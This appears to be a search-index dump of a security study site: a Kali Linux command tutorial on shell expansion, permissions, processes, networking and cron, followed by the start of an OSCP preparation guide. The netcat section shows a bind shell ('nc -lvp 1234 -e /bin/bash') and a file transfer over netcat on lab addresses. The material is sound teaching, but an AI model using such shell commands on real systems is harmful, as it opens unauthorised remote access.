Output to Stdout and Files"},{"location":"linux/linux_cmd/#text_expansion","text":"Each type a command is typed and pressed Enter key, bash performs several substitutions on the text before the command is executed. The process is called as expansion echo is a shell builtin command that prints text arguments on standard output 1 2 root@kali:# echo this is a test this is a test any argument passed to echo gets displayed on the screen 1 2 root@kali:# echo * 0 bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old Note echo didn't print the star as * is expanded by the shell automatically","title":"TEXT EXPANSION"},{"location":"linux/linux_cmd/#pathname_expansion","text":"pathname expansion - the mechanism by which wildcards work Examples 1 2 root@kali:# echo D* Desktop Documents 1 2 root@kali:# echo *s Documents Pictures Templates Videos 1 2 root@kali:# echo [[:upper:]]* Desktop Documents Music Pictures Public Templates Videos 1 2 root@kali:# echo /usr/*/share /usr/local/share","title":"Pathname Expansion"},{"location":"linux/linux_cmd/#pathname_expansion_of_hidden_files","text":"show all hidden directories with echo 1 2 root@kali:# echo .* . .. .cache show only the valid directories with echo 1 2 root@kali:# echo .[!.]* .cache","title":"Pathname Expansion Of Hidden Files"},{"location":"linux/linux_cmd/#tilde_expansion","text":"the tilde character ( ~ ) has a special meaning when used at the beginning of the word, it denotes the home directory 1 2 root@kali:# echo ~ /home/me if the user foo has an account, it expands to 1 2 root@kali:# echo ~foo /home/foo","title":"Tilde Expansion"},{"location":"linux/linux_cmd/#arithmetic_expansion","text":"Shell allows arithmetic expansion to be performed. Use the shell prompt as a calculator syntax: $((expression)) where expression is an arithmetic expression consisting of values and arithmetic operators. 1 2 root@kali:# echo $((2 + 2)) 4","title":"Arithmetic Expansion"},{"location":"linux/linux_cmd/#arithmetic_operators","text":"Operator Description + Addition - Subtraction * Multiplication / Division (but remember, since expansion supports only integer arithmetic, results are integers) % Modulo, which simply means \u201cremainder\u201d ** Exponentiation Note Spaces are not significant in Arithmetic expressions and expressions may be nested 1 2 root@kali:# echo $(($((5**2)) * 3)) 75 Single parentheses may be used to group multiple subexpressions. 1 2 root@kali:# echo $(((5**2) * 3)) 75 Effect of division will always return integers 1 2 3 4 root@kali:# echo Five divided by two equals $((5/2)) Five divided by two equals 2 root@kali:# echo with $((5%2)) left over. with 1 left over.","title":"Arithmetic Operators"},{"location":"linux/linux_cmd/#brace_expansion","text":"","title":"Brace Expansion"},{"location":"linux/linux_cmd/#with_preamble_and_postscript","text":"1 2 root@kali:# echo Front-{A,B,C}-Back Front-A-Back Front-B-Back Front-C-Back - Patterns to be brace expanded may contain a leading portion called a preamble and a trailing portion called a postscript . The brace expression itself may contain either a comma-separated list of strings or a range of integers or single characters. The pattern may not contain unquoted whitespace.","title":"With Preamble and Postscript"},{"location":"linux/linux_cmd/#nested_brace_expansions","text":"1 2 root@kali:# echo a{A{1,2},B{3,4}}b aA1b aA2b aB3b aB4b Making directories with year-month at once 1 2 3 4 5 6 7 root@kali:# mkdir {2007..2009}-{01..12} 2007-01 2007-07 2008-01 2008-07 2009-01 2009-07 2007-02 2007-08 2008-02 2008-08 2009-02 2009-08 2007-03 2007-09 2008-03 2008-09 2009-03 2009-09 2007-04 2007-10 2008-04 2008-10 2009-04 2009-10 2007-05 2007-11 2008-05 2008-11 2009-05 2009-11 2007-06 2007-12 2008-06 2008-12 2009-06 2009-12","title":"Nested Brace Expansions"},{"location":"linux/linux_cmd/#parameter_expansion","text":"in linux, variables can be declared the variables can be called using parameter expansion 1 2 root@kali:# echo $USER root","title":"Parameter Expansion"},{"location":"linux/linux_cmd/#view_available_variables","text":"1 root@kali:# printenv | less With parameter expansion, if the variable is mis-spelled, the expansion will still take place but will result in an empty string. 1 2 3 root@kali:# echo $USER1 root@kali:#","title":"View available variables"},{"location":"linux/linux_cmd/#command_substitution","text":"Command substitution allows us to use the output of a command as an expansion. 1 2 root@kali:# echo $(ls) Desktop Documents Music Pictures Public Templates Videos 1 2 root@kali:# ls -l $(which cp) -rwxr-xr-x 1 root root 71516 2007-12-05 08:58 /bin/cp Entire pipelines can be used 1 2 3 4 5 root@kali:# file $(ls -d /usr/bin/* | grep zip) /usr/bin/bunzip2: symbolic link to `bzip2' /usr/bin/bzip2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, stripped /usr/bin/bzip2recover: ELF 32-bit LSB executable, Intel 80386, version 1 older syntax 1 2 root@kali:# ls -l `which cp` -rwxr-xr-x 1 root root 71516 2007-12-05 08:58 /bin/cp","title":"Command Substitution"},{"location":"linux/linux_cmd/#quoting","text":"1 2 root@kali:# echo this is a test this is a test 1 2 root@kali:# echo The total is $100.00 The total is 00.00 In the first example, word splitting by the shell removed extra whitespace from the echo command\u2019s list of arguments. In the second example, parameter expansion substituted an empty string for the value of $1 because it was an undefined variable.","title":"QUOTING"},{"location":"linux/linux_cmd/#double_quotes","text":"If we place text inside double quotes, all the special characters used by the shell lose their special meaning and are treated as ordinary characters. When double quotes is used, it will suppress word splitting tilde expressions brace expression it will not suppress parameter expansion arithmetic expansion command substitution 1 2 3 root@kali:# ls -l two words.txt ls: cannot access two: No such file or directory ls: cannot access words.txt: No such file or directory Use double quotes to stop the word splitting and get the desired result 1 2 3 root@kali:# ls -l \"two words.txt\" -rw-rw-r-- 1 me me 18 2018-02-20 13:03 two words.txt root@kali:# mv \"two words.txt\" two_words.txt Parameter expansion, arithmetic expansion, command substitution will work` 1 2 3 4 5 6 7 8 root@kali:# echo \"$USER $((2+2)) $(cal)\" me 4 February 2020 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29","title":"Double Quotes"},{"location":"linux/linux_cmd/#single_quotes","text":"If we need to suppress all expansions, we use single quotes . 1 2 3 4 5 6 root@kali:# echo text ~/*.txt { a,b } $( echo foo ) $(( 2 + 2 )) $USER text /home/root/ls-output.txt a b foo 4 root root@kali:# echo \"text ~/*.txt {a,b} $( echo foo ) $(( 2 + 2 )) $USER \" text ~/*.txt { a,b } foo 4 root root@kali:# echo 'text ~/*.txt {a,b} $(echo foo) $((2+2)) $USER' text ~/*.txt { a,b } $( echo foo ) $(( 2 + 2 )) $USER","title":"Single Quotes"},{"location":"linux/linux_cmd/#escaping_characters","text":"to quote only a single character, precede the character with a backslash ( \\ ) 1 2 root@kali:# echo \"The balance for user $USER is: \\$5.00\" The balance for user root is: $5.00 renaming a bad filename (the one with an & or $ or !) 1 root@kali:# mv bad\\&filename good_filename","title":"Escaping Characters"},{"location":"linux/linux_cmd/#backslash_escape_sequences","text":"Escape sequence Meaning \\a Bell (an alert that causes the computer to beep) \\b Backspace \\n Newline; on Unix-like systems, this produces a line feed \\r Carriage return \\t Tab Adding the -e option to echo will enable interpretation of escape sequences 1 root @ kali : # sleep 10 ; echo -e \"Time's up\\a\"","title":"Backslash Escape Sequences"},{"location":"linux/linux_cmd/#advanced_keyboard_tricks","text":"","title":"ADVANCED KEYBOARD TRICKS"},{"location":"linux/linux_cmd/#cursor_movement","text":"Key Action CTRL-A Move cursor to the beginning of the line. CTRL-E Move cursor to the end of the line. CTRL-F Move cursor forward one character; same as the right arrow key. CTRL-B Move cursor backward one character; same as the left arrow key. ALT-F Move cursor forward one word. ALT-B Move cursor backward one word. CTRL-L Clear the screen and move the cursor to the top-left corner. The clear command does the same thing.","title":"Cursor Movement"},{"location":"linux/linux_cmd/#modifying_text","text":"Key Action CTRL-D Delete the character at the cursor location. CTRL-T Transpose (exchange) the character at the cursor location with the one preceding it. ALT-T Transpose the word at the cursor location with the one preceding it. ALT-L Convert the characters from the cursor location to the end of the word to lowercase. ALT-U Convert the characters from the cursor location to the end of the word to uppercase.","title":"Modifying Text"},{"location":"linux/linux_cmd/#cutting_and_pasting_text","text":"Key Action CTRL-K Kill text from the cursor location to the end of line. CTRL-U Kill text from the cursor location to the beginning of the line. ALT-D Kill text from the cursor location to the end of the current word. ALT-BACKSPACE Kill text from the cursor location to the beginning of the current word. If the cursor is at the beginning of a word, kill the previous word. CTRL-Y Yank text from the kill-ring and insert it at the cursor location.","title":"Cutting and Pasting Text"},{"location":"linux/linux_cmd/#completion","text":"Display a list of possible combinations press TAB twice","title":"Completion"},{"location":"linux/linux_cmd/#using_history","text":"Key Action CTRL-P Move to the previous history entry. This is the same action as the up arrow. CTRL-N Move to the next history entry. This is the same action as the down arrow. ALT-< Move to the beginning (top) of the history list. ALT-> Move to the end (bottom) of the history list, i.e., the current command line. CTRL-R Reverse incremental search. This searches incrementally from the current command line up the history list. ALT-P Reverse search, nonincremental. With this key, type in the search string and press ENTER before the search is performed. ALT-N Forward search, nonincremental. CTRL-O Execute the current item in the history list and advance to the next one. This is handy if you are trying to re-execute a sequence of commands in the history list.","title":"Using History"},{"location":"linux/linux_cmd/#history_expansion","text":"Sequence Action !! Repeat the last command. It is probably easier to press the up arrow and ENTER. !number Repeat history list item number.","title":"History Expansion"},{"location":"linux/linux_cmd/#permissions","text":"","title":"PERMISSIONS"},{"location":"linux/linux_cmd/#owners_group_members_and_everyone_else","text":"1 2 3 4 user@kali:$ file /etc/shadow /etc/shadow: regular file, no read permissions user@kali:$ less /etc/shadow /etc/shadow: Permission denied","title":"Owners, Group Members and Everyone Else"},{"location":"linux/linux_cmd/#find_the_users_identity","text":"1 2 root@kali:# id uid=0(root) gid=0(root) groups=0(root) User accounts are defined in the /etc/passwd file, and groups are defined in the /etc/group file. When user accounts and groups are created, these files are modified along with etc/shadow , which holds information about the user\u2019s password. For each user account, the /etc/passwd file defines the user (login) name, uid, gid, account\u2019s real name, home directory, and login shell. If we examine the contents of /etc/passwd and /etc/group , we notice that besides the regular user accounts, there are accounts for the superuser (uid 0) and various other system users.","title":"find the users identity"},{"location":"linux/linux_cmd/#chmod_change_file_mode","text":"use the chmod command to change the permissions of a file or a directory 1 2 3 root@kali:# chmod 600 foo.txt root@kali:# ls -l foo.txt -rw------- 1 root root 0 2018-03-06 14:52 foo.txt","title":"Chmod: Change File Mode"},{"location":"linux/linux_cmd/#umask_-_set_default_permissions","text":"The umask command controls the default permissions given to a file when it is created. It uses octal notation to express a mask of bits to be removed from a file\u2019s mode attributes. 1 2 3 4 5 6 [root@linuxbox ~]# rm -f foo.txt [root@linuxbox ~]# umask 0002 [root@linuxbox ~]# > foo.txt [root@linuxbox ~]# ls -l foo.txt -rw-rw-r-- 1 root root 0 2018-03-06 14:53 foo.txt The \"all users\" does not have write access is because of the mask (2 - binary representation 010 - r-x)","title":"Umask - Set Default Permissions"},{"location":"linux/linux_cmd/#some_special_permissions","text":"","title":"Some Special Permissions"},{"location":"linux/linux_cmd/#changing_identities","text":"The sudo command allows an administrator to set up a configuration file called /etc/sudoers and define specific commands that particular users are permitted to execute under an assumed identity. If the -l option is included, the resulting shell session is a login shell for the specified user. syntax: su -l <user> to start a shell for the superuser 1 2 3 zeenotes@kali:$ su - password: root@kali:# exiting the logged in user 1 2 root@kali:# exit zeenotes@kali:$ commands can be executed using the below syntax syntax: su -c <command>","title":"Changing Identities"},{"location":"linux/linux_cmd/#sudo_executing_a_command_as_another_user","text":"Admin can configure sudo to allow an ordinary user to execute commands as a different user sudo does not require access to superuser's password 1 2 3 root@kali:# sudo backup_script Password: System Backup Starting... To see what privileges are granted by sudo, use the -l option to list them. 1 2 3 root@kali:# sudo -l User me may run the following commands on this host: (ALL) ALL","title":"Sudo: Executing a command as another user"},{"location":"linux/linux_cmd/#chown_change_file_owner_and_group","text":"change the owner and group owner of a file or directory super user privileges are required to use this command syntax: chown <owner>:<group> file.. Argument Results bob Changes the ownership of the file from its current owner to user bob. bob:users Changes the ownership of the file from its current owner to user bob and changes the file group owner to group users. :admins Changes the group owner to the group admins. The file owner is unchanged. bob: Changes the file owner from the current owner to user bob and changes the group owner to the login group of user bob. 1 2 3 4 5 6 7 [janet@linuxbox ~]$ sudo cp myfile.txt ~tony Password: [janet@linuxbox ~]$ sudo ls -l ~tony/myfile.txt -rw-r--r-- 1 root root root 2018-03-20 14:30 /home/tony/myfile.txt [janet@linuxbox ~]$ sudo chown tony: ~tony/myfile.txt [janet@linuxbox ~]$ sudo ls -l ~tony/myfile.txt -rw-r--r-- 1 tony tony tony 2018-03-20 14:30 /home/tony/myfile.txt we see user janet copy the file from her directory to the home directory of user tony. Next, janet changes the ownership of the file from root (a result of using sudo) to tony.","title":"Chown: Change File Owner and Group"},{"location":"linux/linux_cmd/#chgrp_change_group_ownership","text":"","title":"chgrp: Change group ownership"},{"location":"linux/linux_cmd/#changing_the_password","text":"changing the password of other users syntax: passwd <username> changing the password of the current user syntax: passwd 1 2 3 root@kali:# passwd (current) UNIX password: New UNIX password:","title":"Changing the password"},{"location":"linux/linux_cmd/#processes","text":"","title":"PROCESSES"},{"location":"linux/linux_cmd/#viewing_processes","text":"1 2 3 4 root@kali:# ps PID TTY TIME CMD 2945 pts/0 00:00:00 bash 3179 pts/0 00:00:00 ps TTY is short for \u201cteletype\u201d and refers to the controlling terminal for the process. show all processes regardless of the terminal they are controlled by 1 2 3 4 5 6 root@kali:# ps -x PID TTY STAT TIME COMMAND 1 ? Ss 0:04 /sbin/init 2 ? S 0:00 [kthreadd] 3 ? I< 0:00 [rcu_gp] 4 ? I< 0:00 [rcu_par_gp] process states State Meaning R Running. This means the process is running or ready to run. S Sleeping. The process is not running; rather, it is waiting for an event, such as a keystroke or network packet. D Uninterruptible sleep. The process is waiting for I/O such as a disk drive. T Stopped. The process has been instructed to stop. You\u2019ll learn more about this later in the chapter. Z A defunct or \u201czombie\u201d process. This is a child process that has terminated but has not been cleaned up by its parent. < A high-priority process. It\u2019s possible to grant more importance to a process, giving it more time on the CPU. This property of a process is called niceness. N A low-priority process. A process with low priority (a nice process) will get processor time only after other processes with higher priority have been serviced. viewing processes belonging to every user 1 2 3 4 5 6 root@kali:# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.2 104004 10068 ? Ss 08:34 0:04 /sbin/init root 2 0.0 0.0 0 0 ? S 08:34 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? I< 08:34 0:00 [rcu_gp] root 4 0.0 0.0 0 0 ? I< 08:34 0:00 [rcu_par_gp] Header Meaning USER User ID. This is the owner of the process. %CPU CPU usage in percent. %MEM Memory usage in percent. VSZ Virtual memory size. RSS Resident set size. This is the amount of physical memory (RAM) the process is using in kilobytes. START Time when the process started. For values over 24 hours, a date is used. viewing processes dynamically The top program displays a continuously updating (by default, every three seconds) display of the system processes listed in order of process activity. 1 2 3 4 5 6 root@kali:# top top - 16:35:53 up 8:00, 1 user, load average: 0.15, 0.06, 0.02 Tasks: 229 total, 1 running, 228 sleeping, 0 stopped, 0 zombie %Cpu(s): 23.5 us, 5.9 sy, 0.0 ni, 70.6 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st MiB Mem : 3924.2 total, 1864.0 free, 978.9 used, 1081.2 buff/cache MiB Swap: 4094.0 total, 4094.0 free, 0.0 used. 2616.5 avail Mem The top program accepts a number of keyboard commands. The two most interesting are h , which displays the program\u2019s help screen, and q , which quits top.","title":"Viewing Processes"},{"location":"linux/linux_cmd/#controlling_processes","text":"interrupting a process Press Ctrl + C to interrupt a program putting a process in the background 1 2 root@kali:# xlogo & [1] 3287 1 2 3 4 5 root@kali:# ps PID TTY TIME CMD 2095 pts/1 00:00:00 bash 3287 pts/1 00:00:00 xlogo 3288 pts/1 00:00:00 ps see the list of jobs using the jobs command 1 2 root@kali:# jobs [1]+ Running xlogo & returning a process to the foreground 1 root@kali:# fg %1 The fg command followed by a percent sign and the job number (called a jobspec ) stopping a process use Ctrl + Z to stop a foreground running process","title":"Controlling Processes"},{"location":"linux/linux_cmd/#signals","text":"The kill command is used to send signals to programs. syntax: kill -signal PID Number Name Meaning 1 HUP Hang up. This is a vestige of the good old days when terminals were attached to remote computers with phone lines and modems. The signal is used to indicate to programs that the controlling terminal has \u201chung up.\u201d The effect of this signal can be demonstrated by closing a terminal session. The foreground program running on the terminal will be sent the signal and will terminate. 2 INT Interrupt. This performs the same function as CTRL-C sent from the terminal. It will usually terminate a program. 9 KILL Kill. This signal is special. Whereas programs may choose to handle signals sent to them in different ways, including ignoring them all together, the KILL signal is never actually sent to the target program. Rather, the kernel immediately terminates the process. When a process is terminated in this manner, it is given no opportunity to \u201cclean up\u201d after itself or save its work. For this reason, the KILL signal should be used only as a last resort when other termination signals fail. 15 TERM Terminate. This is the default signal sent by the kill command. If a program is still \u201calive\u201d enough to receive signals, it will terminate. 18 CONT Continue. This will restore a process after a STOP or TSTP signal. This signal is sent by the bg and fg commands. 19 STOP Stop. This signal causes a process to pause without terminating. Like the KILL signal, it is not sent to the target process, and thus it cannot be ignored. 20 TSTP Terminal stop. This is the signal sent by the terminal when CTRL-Z is pressed. Unlike the STOP signal, the TSTP signal is received by the program, but the program may choose to ignore it. Processes, like files, have owners, and you must be the owner of a process (or the superuser) to send it signals with kill. other common signals Number Name Meaning 3 QUIT Quit. 11 SEGV Segmentation violation. This signal is sent if a program makes illegal use of memory; that is, if it tried to write somewhere it was not allowed to write. 28 WINCH Window change. This is the signal sent by the system when a window changes size. Some programs, such as top and less, will respond to this signal by redrawing themselves to fit the new window dimensions. display a complete list of signals 1 2 3 root@kali:# kill -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1 sending signals to multiple processes with killall syntax: killall [-u user] [-signal] name ... 1 2 3 root@kali:# killall xlogo [1]- Terminated xlogo [2]+ Terminated xlogo Remember, as with kill, you must have superuser privileges to send signals to processes that do not belong to you.","title":"Signals"},{"location":"linux/linux_cmd/#user_access_control","text":"","title":"USER ACCESS CONTROL"},{"location":"linux/linux_cmd/#currently_logged_in_user","text":"1 2 root@kali:~# whoami root","title":"currently logged in user"},{"location":"linux/linux_cmd/#adding_a_new_user","text":"1 root@kali:~# adduser zeenotes","title":"adding a new user"},{"location":"linux/linux_cmd/#adding_a_user_to_the_sudoers_file","text":"1 2 3 4 root@kali:~# adduser zeenotes sudo Adding user 'zeenotes' to group `sudo' ... Adding user zeenotes to group sudo Done.","title":"adding a user to the sudoers file"},{"location":"linux/linux_cmd/#switching_users_and_using_sudo","text":"1 2 3 4 5 6 7 8 9 root@kali:~# su zeenotes zeenotes@kali:/root$ zeenotes@kali:/root$ sudo adduser john [sudo] password for zeenotes:Adding user `john' ... Adding new group `john' (1002) ... Adding new user `john' (1002) with group `john' ... --snip-- zeenotes@kali:/root$ su Password:root@kali:~#","title":"switching users and using sudo"},{"location":"linux/linux_cmd/#files","text":"creating a new file 1 root@kali:~# touch myfile creating a new directory 1 root@kali:~# mkdir mydirectory","title":"FILES"},{"location":"linux/linux_cmd/#adding_text_to_file","text":"echo the output 1 2 root@kali:~# echo hello zeenotes hello zeenotes saving text to a file 1 root@kali:~# echo hello zeenotes > myfile view the of a file 1 root@kali:~# cat myfile echo a different line of text to the file This will overwrite the contents of the file 1 root@kali:~# echo hello zeenotes again > myfile apppending text to a file 1 root@kali:~# echo hello zeenotes second time >> myfile appending preserves the content of the file","title":"Adding Text To File"},{"location":"linux/linux_cmd/#file_permissions","text":"view the permissions of the file 1 2 root@kali:~# ls -l myfile -rw-r--r-- 1 root root 47 Apr 23 21:15 myfile -rw-r--r-- file type and permissions 1 number of links to the file root user who owns the file root group that owns the file 47 file_size Apr 23 21:15 date modified myfile filename Linux permissions r - read w - write x - execute -rw- - permission for the owner -r-- - permission for the group -r-- - permission for all users change permissions on a file 1 2 3 root@kali:~# chmod 700 myfile root@kali:~# ls -l myfile -rwx------ 1 root root 47 Apr 23 21:15 myfile When entering new file permissions, you use one digit for the owner, one for the group, and one for world. Editing files 1 root@kali:~# nano myfile nano is a text editor vi is another text editor available in linux","title":"File Permissions"},{"location":"linux/linux_cmd/#data_manipulation","text":"Let's take a file with the following contents 1 2 3 4 5 6 7 8 root@kali:~/mydirectory# cat myfile 1 Derbycon September 2 Shmoocon January 3 Brucon September 4 Blackhat July 5 Bsides * 6 HackerHalted October 7 Hackcon April using grep grep looks for instances of a text string in a file 1 2 3 root@kali:~# grep September myfile 1 Derbycon September 3 Brucon September chaining commands send the output of grep to other command for processing using (|) pipe command using cut command 1 2 3 root@kali:~# grep September myfile | cut -d \" \" -f 2 Derbycon Brucon The cut command allows to take each line of input, choose a delimiter, and print specific fields. using sed command The sed command is ideal for editing files automatically based on certain patterns or expressions. For example, to replace all instances of the word Blackhat with Defcon in myfile 1 2 3 4 5 6 7 8 root@kali:~# sed 's/Blackhat/Defcon' myfile 1 Derbycon September 2 Shmoocon January 3 Brucon September 4 Defcon July 5 Bsides * 6 HackerHalted October 7 Hackcon April using awk for pattern matching For example, to find conferences numbered 6 or greater, use awk to search the first field for entries greater than 5 1 2 3 root@kali:~# awk '$1 >5' myfile 6 HackerHalted October 7 Hackcon April to print only the first and third words in every line 1 2 3 4 5 6 7 8 root @ kali :~ # awk '{print $1,$3;}' myfile 1 September 2 January 3 September 4 July 5 * 6 October 7 April","title":"Data Manipulation"},{"location":"linux/linux_cmd/#manage_installed_packages","text":"On Debian-based Linux distributions such as Kali Linux, use the Advanced Packaging Tool (apt) to manage packages. installing a package 1 root@kali:~# apt-get install armitage upgrading a package 1 root@kali:~# apt-get upgrade The repositories Kali uses for packages are listed in the file /etc/apt/sources.list Edit this file to add additional repositories. Run command apt-get update to refresh the database to include the new repositories","title":"MANAGE INSTALLED PACKAGES"},{"location":"linux/linux_cmd/#processes_and_services","text":"starting a service 1 2 3 root@kali:~# service apache2 start [....] Starting web server: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName . ok stopping a service 1 root@kali:~# service apache2 stop restarting a service 1 root@kali:~# service apache2 restart Note If the command requires sudo level access, type sudo service apache2 start","title":"PROCESSES AND SERVICES"},{"location":"linux/linux_cmd/#networking","text":"ping an ip 1 2 3 4 5 6 7 8 9 10 root@kali:~# ping 192.168.20.10 PING 192.168.20.10 (192.168.20.10) 56(84) bytes of data. 64 bytes from 192.168.20.10: icmp_req=1 ttl=64 time=0.090 ms 64 bytes from 192.168.20.10: icmp_req=2 ttl=64 time=0.029 ms 64 bytes from 192.168.20.10: icmp_req=3 ttl=64 time=0.038 ms 64 bytes from 192.168.20.10: icmp_req=4 ttl=64 time=0.050 ms **^C** --- 192.168.20.10 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 2999 ms rtt min/avg/max/mdev = 0.029/0.051/0.090/0.024 ms view network information ifconfig command 1 2 3 4 5 6 7 8 9 10 root@kali:~# ifconfig eth0\u2776 Link encap:Ethernet HWaddr 00:0c:29:df:7e:4d inet addr:192.168.20.9\u2777 Bcast:192.168.20.255 Mask:255.255.255.0\u2778 inet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:1756332 errors:930193 dropped:17 overruns:0 frame:0 TX packets:1115419 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:1048617759 (1000.0 MiB) TX bytes:115091335 (109.7 MiB) Interrupt:19 Base address:0x2024 eth0 - network interface inet addr: 192.168.20.9 - ip address Mask: 255.255.255.0 - Network Mask The address\u2019s network mask, or netmask (Mask), at \u2778 identifies which parts of the IP address are part of the network and which parts belong to the host. The default gateway is where the host routes traffic to other networks. Any traffic destined outside the local network will be sent to the default gateway for it to figure out where it needs to go.","title":"NETWORKING"},{"location":"linux/linux_cmd/#setting_a_static_ip_address","text":"Network connection uses the DHCP (Dynamic Host Configuration Protocol) protocol to pull IP address from the network. Edit the file /etc/network/interfaces to change the IP address contents of the /etc/network/interfaces file 1 2 3 4 5 6 # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback 1 2 3 4 5 6 7 8 9 10 11 # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback auto eth0 iface eth0 inet static \u2776 address 192.168.20.9 netmask 255.255.255.0 \u2777 gateway 192.168.20.1 \u2778 once the above file is edited, restart networking restart networking 1 root@kali:~# service networking restart viewing network connections To view network connections, listening ports etc, netstat command may be used 1 2 3 4 root@kali:~# netstat -antp Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp6 0 0 :::80 :::* LISTEN 15090/apache2","title":"setting a static ip address"},{"location":"linux/linux_cmd/#netcat","text":"view help of netcat 1 2 3 4 5 6 7 8 9 root@kali:~# nc -h [v1.10-40] connect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [-options] [hostname] [port] options: -c shell commands as `-e'; use /bin/sh to exec [dangerous!!] -e filename program to exec after connect [dangerous!!] -b allow broadcasts --snip-- check if a port is listening 1 2 root@kali:~# nc -v 192.168.20.9 80 (UNKNOWN) [192.168.20.10] 80 (http) open other option could be 1 2 3 4 5 6 7 8 root@kali:~# nc -vv 192.168.20.10 25 nc: 192.168.20.10 (192.168.20.10) 25 [smtp]\u2776 open nc: using stream socket nc: using buffer size 8192 nc: read 66 bytes from remote 220 bookxp SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here nc: wrote 66 bytes to local listen on a port for an incoming connection 1 2 root@kali:~# nc -lvp 1234 listening on [any] 1234 ... l - listen v - verbose p - port open a second terminal and use netcat to connect to the netcat listener 1 2 root@kali:~# nc 192.192.168.20.9 1234 hi zeenotes Once the connection is established, the text appears on the listener 1 2 3 listening on [any] 1234 ... connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51917 hi zeenotes use Ctrl + C to close netcat processes open a command shell listener using netcat use the -e flag to tell netcat to execute /bin/bash when a connection is received 1 2 root@kali:~# nc -lvp 1234 -e /bin/bash listening on [any] 1234 ... Use a second terminal to connect to a netcat listener 1 2 3 root@kali:~# nc 192.192.168.20.9 1234 whoami root output what comes to the listener to the screen send file contents across with netcat first terminal 1 2 root@kali:~# nc -lvp 1234 > netcatfile listening on [any] 1234 ... second terminal use the < symbol to send the contents of a file 1 root@kali:~# nc 192.168.20.9 1234 < mydirectory/myfile","title":"Netcat"},{"location":"linux/linux_cmd/#automating_tasks_with_cron_job","text":"cron command allows to schedule tasks to automatically run at a specified time cron related files are present in the /etc directory 1 2 3 4 5 6 7 root@kali:/etc# ls | grep cron cron.d cron.daily cron.hourly cron.monthly crontab cron.weekly The cron.daily , cron.hourly , cron.monthly , and cron.weekly directories specify scripts that will run automatically, every day, every hour, every month, or every week, depending on which directory you put your script in. cron's configuration file is /etc/crontab 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \\# /etc/crontab: system-wide crontab \\# Unlike any other crontab you don't have to run the `crontab' \\# command to install the new version when you edit this file \\# and files in /etc/cron.d. These files also have username fields, \\# that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin \\# m h dom mon dow user command 17 * * * * root cd / && run-parts --report /etc/cron.hourly \u2776 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) \u2777 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) \\#","title":"Automating tasks with Cron job"},{"location":"oscp/","text":"OSCP Prep Guide The Journey to Try Harder: TJnull\u2019s Preparation Guide for PWK/OSCP Table of Contents: Overview Dedication A Word of Warning! Section 1: Getting Comfortable with Kali Linux Section 2: Essential Tools in Kali Section 3: Passive Reconnaissance Section 4: Active Reconnaissance Section 5: Vulnerability Scanning Section 6: Buffer Overflows Section 7: Handling Public Exploits Section 8: Transferring Files to your target Section 9: Privilege Escalation Section 10: Client-Side Attacks Section 11: Web Application Attacks Section 12: Password Cracking Section 13: Port Redirection and Pivoting Section 14: Metasploit Framework Section 15: Antivirus Bypassing Extra Resources Setting up your Pentesting Environment Wargames/Hands_on Challenges Capture the Flag Competitions (CTFs)/Cyber Competitions Bug Bounty Programs Vulnerable Machines Tips to participate in the Proctored OSCP exam Other Resources Conclusion Overview For the past 4 years of my life I had one goal: Pass OSCP on my first try. I started by reviewing the course syllabus and I realized there were some things that I did not know, which made me nervous to start the course. So, I went through a variety of resources until I thought I was ready to begin. This guide contains those resources and my advice to prepare for your adventure to take the PWK/OSCP! Dedication For those of you that would like to know about my journey when I took the course and exam, you can find my earlier post here: https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html A big shout out goes to abatchy! Without his guide I would have never started exploring for other resources. Thank you for creating your original guide: https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob I also want to thank the following people for taking the time to read this guide: Rey Bango Tunny Traffic aka VCSEC. A moderator at Netsec Focus G0t Mi1k The team at Offensive Security This guide has been approved by Offensive Security! A Word of Warning! Do not expect these resources to be the main thing you use for obtaining OSCP. When you are ready to take the course, you should expect the following: Spending a lot of time researching. Do not expect the admins or even other students to give you answers easily. Plan to make a commitment to this and have an open mindset to learning new things. Know your tools! There are certain tools that you cannot use for the exam. However, that does not mean you should skip over them. Take some time to understand them because you may have to use them on an actual engagement or in the field. Remember Offensive Security motto: TRY HARDER As of now Offensive Security has restricted the following tools: Commercial tools or services (Metasploit Pro, Burp Pro, etc.) Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.) Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.) Features in other tools that utilize either forbidden or restricted exam limitations Reference: 